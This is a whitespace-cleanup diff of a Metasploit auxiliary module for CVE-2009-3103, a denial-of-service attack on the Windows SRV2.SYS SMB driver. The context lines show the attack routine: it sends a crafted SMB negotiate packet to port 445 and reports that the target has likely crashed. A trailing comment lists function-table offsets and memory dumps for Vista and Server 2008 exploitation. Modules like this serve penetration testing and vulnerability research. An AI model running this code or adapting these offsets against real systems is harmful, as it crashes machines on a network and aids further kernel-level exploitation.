@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -15,7 +15,7 @@ class Metasploit3 < Msf::Auxiliary
     include Msf::Auxiliary::Dos
 
     def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference',
 			'Description'    => %q{
 				This module exploits an out of bounds function table dereference in the SMB
@@ -27,7 +27,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Author'         => [ 'laurent.gaffie[at]gmail.com', 'hdm' ],
 			'License'        => MSF_LICENSE,
 			'Version'        => '$Revision$',
-			'References' => 
+			'References' =>
 				[
 					['CVE', '2009-3103'],
 					['BID', '36299'],
@@ -41,13 +41,13 @@ class Metasploit3 < Msf::Auxiliary
 			Opt::RPORT(445),
 			OptInt.new('OFFSET', [true, 'The function table offset to call', 0xffff])
 		], self.class)
-				
+
 	end
 
 
 	def run
 		connect()
-		
+
 		# The SMB 2 dialect must be there
 		dialects = ['PC NETWORK PROGRAM 1.0', 'LANMAN1.0', 'Windows for Workgroups 3.1a', 'LM1.2X002', 'LANMAN2.1', 'NT LM 0.12', 'SMB 2.002']
 		data     = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join('')
@@ -65,13 +65,13 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Sending request and waiting for a reply...")
 		sock.put(pkt.to_s)
 		r = sock.get_once
-		
+
 		if(not r)
 			print_status("The target system has likely crashed")
 		else
 			print_status("Response received: #{r.inspect}")
 		end
-		
+
 		disconnect()
 	end
 
@@ -95,11 +95,11 @@ end
 	0x76 = ExAllocatePoolWithTag
 	0x77 = ExFreePool
 	0x86 = ExAllocatePoolWithTag
-	0x87 = ExFreePoo	
+	0x87 = ExFreePoo
 	0x96 = ExAllocatePoolWithTag
-	0x97 = ExFreePoo		
+	0x97 = ExFreePoo
 	0xa6 = ExAllocatePoolWithTag
-	0xa7 = ExFreePoo	
+	0xa7 = ExFreePoo
 	0xb9 = BugCheckEx
 	0xc7 = SrvBalanceCredits
 	0xdf = SrvNetStatistics data
@@ -114,10 +114,10 @@ end
 	0x0179 = SrvProcessOplockBreakTimer
 	0x0185 = L"XactSrv"
 	0x01f8 = WppTraceCallback
-	
-	
+
+
 	Offsets on Vista SP1 (no updates) x86:
-	
+
 	0x64 = mov esp, ebp; pop ebp, ret
 	0xde = pool with tag
 
@@ -154,6 +154,6 @@ end
 	734 -> 802015ff - ffde03f078f8ff7f7c02f8ff3ffe01fe
 	760 -> 99b4ff28 - 8bff558bec6a00ff7514ff7510ff750c
 	804 -> 830ffc7d - 0000001722268b3e012004020010c01c
-	
+
 
 =end
